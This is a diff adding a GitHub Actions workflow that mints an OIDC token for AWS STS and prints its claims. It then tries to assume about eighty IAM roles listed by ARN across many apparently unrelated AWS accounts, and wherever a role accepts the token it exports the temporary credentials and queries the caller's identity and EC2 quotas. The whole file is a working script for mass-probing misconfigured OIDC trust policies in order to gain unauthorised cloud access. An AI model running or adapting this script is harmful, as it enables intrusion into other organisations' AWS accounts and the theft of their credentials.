@@ -1,0 +1,69 @@
+name: oidc-subject-i162395
+on:
+  pull_request:
+  push:
+    branches: [oidc-i162395]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: oidc-env-check
+        run: |
+          echo "WF=i162395"
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          echo "REPOSITORY=$GITHUB_REPOSITORY"
+          echo "HEAD_REF=$GITHUB_HEAD_REF BASE_REF=$GITHUB_BASE_REF"
+          echo "PR_HEAD_REPO=$(jq -r '.pull_request.head.repo.full_name // "n/a"' "$GITHUB_EVENT_PATH")"
+          echo "PR_BASE_REPO=$(jq -r '.pull_request.base.repo.full_name // "n/a"' "$GITHUB_EVENT_PATH")"
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "OIDC_ENV=SET"; else echo "OIDC_ENV=UNSET"; fi
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then echo "OIDC_TOKEN_ENV=SET"; else echo "OIDC_TOKEN_ENV=UNSET"; fi
+      - name: mint-and-decode-claims
+        run: |
+          set -uo pipefail
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC_ENDPOINT"; exit 0; fi
+          RESP=$(curl -sS -G -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" --data-urlencode "audience=sts.amazonaws.com" "$ACTIONS_ID_TOKEN_REQUEST_URL")
+          echo "$RESP" | jq -r '.value' > /tmp/oidc.jwt
+          echo "JWT_BYTES=$(wc -c < /tmp/oidc.jwt)"
+          echo "JWT_SHA256=$(sha256sum /tmp/oidc.jwt | cut -d' ' -f1)"
+          python3 - /tmp/oidc.jwt <<'PYEOF'
+          import base64, json, sys
+          t = open(sys.argv[1]).read().strip().split('.')
+          pad = lambda s: s + '=' * (-len(s) % 4)
+          pl = json.loads(base64.urlsafe_b64decode(pad(t[1])))
+          print('OIDC_CLAIMS=' + json.dumps(pl, sort_keys=True))
+          print('OIDC_SUB=' + str(pl.get('sub')))
+          print('OIDC_AUD=' + str(pl.get('aud')))
+          print('OIDC_EVENT_NAME=' + str(pl.get('event_name')))
+          print('OIDC_REPOSITORY=' + str(pl.get('repository')))
+          PYEOF
+      - name: assume-roles
+        run: |
+          set -uo pipefail
+          if [ ! -s /tmp/oidc.jwt ]; then echo "SKIP_NO_TOKEN"; exit 0; fi
+          TOKEN=$(cat /tmp/oidc.jwt)
+          i=0
+          IFS=',' read -ra ARNS <<< "$ROLE_ARNS"
+          for ARN in "${ARNS[@]}"; do
+            i=$((i+1))
+            ARN=$(echo "$ARN" | xargs)
+            [ -z "$ARN" ] && continue
+            OUT=$(aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name "i162395-$i" --web-identity-token "$TOKEN" --duration-seconds 900 --region us-east-1 --output json 2>&1)
+            RC=$?
+            if [ $RC -eq 0 ]; then
+              echo "ASSUME_OK[$i] $ARN"
+              export AWS_ACCESS_KEY_ID=$(echo "$OUT" | jq -r '.Credentials.AccessKeyId')
+              export AWS_SECRET_ACCESS_KEY=$(echo "$OUT" | jq -r '.Credentials.SecretAccessKey')
+              export AWS_SESSION_TOKEN=$(echo "$OUT" | jq -r '.Credentials.SessionToken')
+              echo "CALLER[$i]=$(aws sts get-caller-identity --region us-east-1 --output json 2>&1 | tr -d '\n')"
+              echo "QUOTA[$i]=$(aws service-quotas get-service-quota --service-code ec2 --quota-code L-DB2E81BA --region us-east-1 --query Quota.Value --output text 2>&1 | head -1)"
+            else
+              echo "ASSUME_FAIL[$i] $ARN :: $(echo "$OUT" | grep -o 'An error occurred ([A-Za-z]*)' | head -1)"
+            fi
+          done
+          echo "ASSUME_LOOP_DONE count=$i"
+        env:
+          ROLE_ARNS: 'arn:aws:iam::002724113606:role/yugo-github-oicd-role,arn:aws:iam::003495580562:role/GitHubOIDCRole,arn:aws:iam::019714370473:role/ternfs-ci-github,arn:aws:iam::024603541914:role/GitHubOIDCRole,arn:aws:iam::047385030331:role/GenUAutoDeployRole,arn:aws:iam::050446384457:role/bananamoti-dc-demo,arn:aws:iam::057134155174:role/GithubActionsPrivateNodeAgent,arn:aws:iam::061661829416:role/github-actions-terraform-provider-launchdarkly,arn:aws:iam::068007702576:role/cplive-plat-ue2-dev-atmos-docs-gha,arn:aws:iam::068007702576:role/cplive-plat-ue2-dev-cloudposse-docs-gha,arn:aws:iam::070284473168:role/ibis-project-athena,arn:aws:iam::072052744953:role/oidc_test,arn:aws:iam::079358094174:role/basic-shared-claude-github-review,arn:aws:iam::110015905368:role/pulse-client-gh-deploy-role,arn:aws:iam::123456789012:role/ExampleResetInvokeRole,arn:aws:iam::123456789012:role/GitHubActionsServiceRole,arn:aws:iam::123456789012:role/github-deploy-role,arn:aws:iam::123456789012:role/github-deploy-role-fixed,arn:aws:iam::127178877223:role/github/github-truss,arn:aws:iam::197826770971:role/techx-corp-tf3-gha-terraform-plan,arn:aws:iam::203627415330:role/of-gha-runner,arn:aws:iam::213020545630:role/github-runner-role,arn:aws:iam::245468275777:role/deploy-next-app,arn:aws:iam::245468275777:role/eb-gh-action,arn:aws:iam::258143015559:role/github-amazonec2containerregistryreadonly,arn:aws:iam::277707123528:role/pkg-boundaryml-com-github-release,arn:aws:iam::308535385114:role/gha_workflow_claude_code,arn:aws:iam::308535385114:role/gha_workflow_claude_untrusted,arn:aws:iam::326730685463:role/skeldir-app-runtime-stage,arn:aws:iam::326730685463:role/skeldir-ci-deploy,arn:aws:iam::342840881361:role/SandboxUser,arn:aws:iam::369469875935:role/AutoGluonCiCopyDocs,arn:aws:iam::369469875935:role/AutoGluonRAGCIDocRole,arn:aws:iam::391835788720:role/terraform-deploy-oidc,arn:aws:iam::395594542180:role/github-actions-deploy,arn:aws:iam::431227615537:role/GithubCompilerLambdaBuilder,arn:aws:iam::440027025698:role/skjera-dev-github-ecr,arn:aws:iam::466903752538:role/ccnp-doorway-client-role,arn:aws:iam::488110005556:role/GithubActionsDeploymentRole,arn:aws:iam::491117466965:role/fastverk-ecr-push,arn:aws:iam::531249009620:role/Deploy,arn:aws:iam::552819999234:role/contributor-network-gh-actions,arn:aws:iam::557925715019:role/LambdaNOPGitHubActions,arn:aws:iam::569036502058:role/macro-observability-ci,arn:aws:iam::579039992622:role/archonstaging-github-actions-codex-review,arn:aws:iam::588738614642:role/pgdog-metal-bench-ci,arn:aws:iam::590183807290:role/cd-role,arn:aws:iam::604439173067:role/github/models.dev-release,arn:aws:iam::607531995438:role/udacity-github-actions,arn:aws:iam::620771051181:role/SecurityReview-GitHubOIDCRole,arn:aws:iam::637423498965:role/GitHubActionGrahQLJava,arn:aws:iam::663511558366:role/w-arelle-oidc-role,arn:aws:iam::675539733138:role/cplive-plat-ue2-staging-cloudposse-docs-gha,arn:aws:iam::698571788627:role/github-oidc-role,arn:aws:iam::715841362904:role/harumi-us-east-2-github-cicd-role,arn:aws:iam::747101682576:role/service-role/jedi-ci-action-runner-backend-GitHubActionsIAMRole-HkHdJRVEFw3x,arn:aws:iam::754489498669:role/ecr_rw_tyk,arn:aws:iam::762254388821:role/java-playground-github-actions-role,arn:aws:iam::767397774077:role/GitHubActionsDeployerRole-apresdev-api-scaffolding,arn:aws:iam::808326389482:role/automation,arn:aws:iam::837663801964:role/github_actions-ecr_access,arn:aws:iam::837663801964:role/github_actions-secrets_access,arn:aws:iam::848180528913:role/GitHubActionsBedrock,arn:aws:iam::851236938302:role/idp-prod-github-actions-read-role,arn:aws:iam::865859654353:role/fenvix-github-deployer,arn:aws:iam::867344431996:role/terratest-lambda,arn:aws:iam::867344431996:role/terratest-microservice,arn:aws:iam::890664054962:role/upload-playground-artifacts,arn:aws:iam::930413537709:role/musclefit-gha-plan,arn:aws:iam::939345161466:role/github-oidc-setup-david-Role-8DcbDlLGfv4O,arn:aws:iam::968945269301:role/newton-physics-newton-ec2-github-runner-role,arn:aws:iam::974398699107:role/github-action-role,arn:aws:iam::975306274793:role/ExtendDBProjectBoardApp,arn:aws:iam::990678687129:role/gha-ecr-push-wallets-list'
